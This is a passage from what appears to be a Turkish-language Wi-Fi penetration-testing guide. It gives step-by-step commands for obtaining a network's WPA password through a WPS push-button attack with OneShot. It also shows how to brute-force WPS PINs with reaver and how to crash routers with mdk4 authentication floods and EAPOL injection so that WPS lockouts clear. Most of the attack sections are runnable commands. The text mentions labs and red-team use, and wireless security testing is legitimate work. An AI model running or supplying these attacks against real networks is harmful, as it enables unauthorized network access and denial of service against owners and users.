`wpa_supplicant` durumunu kontrol ederek WPA anahtar anlaşmasının tamamlandığından emin olun:
```bash
systemctl status wpa_supplicant
```

**Adım 4: IP Adresi Alma**
Ağa başarıyla bağlandıktan sonra geçerli bir IP adresi almak için DHCP istemcisini çalıştırın ve `ifconfig` ile kontrol edin:
```bash
sudo dhclient wlan0
ifconfig
```

---

### Yöntem B: OneShot ile Otomatize Saldırı
`Oneshot`, PBC sömürüsünü otomatikleştirerek ağın WPA şifresini (PSK) doğrudan elde etmenizi sağlar.

**Adım 1: Monitör Modu Aktifleştirme**
Çakışan servisleri durdurup `wlan0` arayüzünü monitör moda alın:
```bash
airmon-ng start wlan0
```

**Adım 2: OneShot PBC Saldırısını Başlatma**
`--pbc` argümanını kullanarak aracı çalıştırın:
```bash
python3 /opt/OneShot/oneshot.py -i wlan0mon --pbc
```
*Araç, AP ile WPS mesajlaşmalarını (M1-M8) otomatik tamamlar ve `[+] WPA PSK: '<Şifre>'` şeklinde ağın parolasını ekrana basar.*

> **Not:** Laboratuvar ortamlarında router butonu genellikle otomatik olarak her 15 saniyede bir "basılmış" gibi tetiklenir. Normal şartlarda bu 2 dakikalık dinleme penceresi dışarıdan sömürüye açıktır.


# MDK4 ile Hedef AP Çökertme ve WPS Kilitlerini Aşma (DoS)

Kaba kuvvet (brute-force) saldırıları sırasında Access Point (AP) çok fazla hatalı PIN denemesi algıladığında kendini kilitleyebilir. Gecikme tabanlı kilitler `reaver` parametreleriyle (`-l` ve `-r`) aşılabilirken; cihazın yeniden başlatılmasını (reset) gerektiren kalıcı kilitler **Denial-of-Service (DoS)** saldırılarıyla aşılabilir. 

Cihazı çökerterek yeniden başlatılmaya zorlamak, WPS kilidinin kalkmasını sağlayabilir. Bu işlem için 3 ayrı terminal kullanılır.

## 1. Terminal: Saldırıyı Başlatma
Reaver ile standart WPS PIN kırma işlemi başlatılır. AP kilitlendiğinde bu işlem takılı kalacaktır.
```bash
sudo reaver -l 100 -r 3:45 -i wlan0mon -b [BSSID] -c [KANAL]
```

## 2. Terminal: WPS Durumunu İzleme
`airodump-ng` ile AP'nin WPS durumunun `Locked` (Kilitli) olup olmadığı anlık olarak izlenir.
```bash
airodump-ng --wps --bssid [BSSID] -c [KANAL] wlan0mon
```

## 3. Terminal: MDK4 DoS Saldırıları
AP kilitlendiyse, cihazı çökertmek için `mdk4` aracıyla aşağıdaki modüllerden biri denenir. Hedefin yeniden başladığını (ve WPS kilidinin kalktığını) 2. Terminal'den takip edebilirsiniz.

### Yöntem A: Authentication Denial-of-Service Flooding (Modül 'a')
Sahte MAC adresleri üreterek AP'nin istemci listesini doldurur ve cihazı çökerterek resetlenmeye zorlar.
```bash
# Standart Authentication DoS
sudo mdk4 wlan0mon a -a [BSSID]

# Akıllı Test (İstemcileri bağlı tutmak için veri enjekte eder)
sudo mdk4 wlan0mon a -i [BSSID]
```

### Yöntem B: EAPOL Start ve Logoff Injection (Modül 'e')
Eğer Auth DoS işe yaramazsa, EAPOL paketleri enjekte edilerek cihaz yorulur.
```bash
# EAPOL Start mesajları ile yorma
sudo mdk4 wlan0mon e -t [BSSID]

# EAPOL Logoff mesajları ile istemcileri ağdan atma
sudo mdk4 wlan0mon e -t [BSSID] -l
```

> **Önemli Notlar:**
> * Bu çökertme (reset) yöntemi genellikle **eski model yönlendiricilerde (router)** işe yarar. Yeni nesil cihazlar bu tür DoS saldırılarına karşı korumalıdır.
> * Ağda çok fazla gürültü yaratır ve gizliliği tamamen ortadan kaldırır. Sızma testlerinde (Red Team) son çare olarak kullanılmalıdır.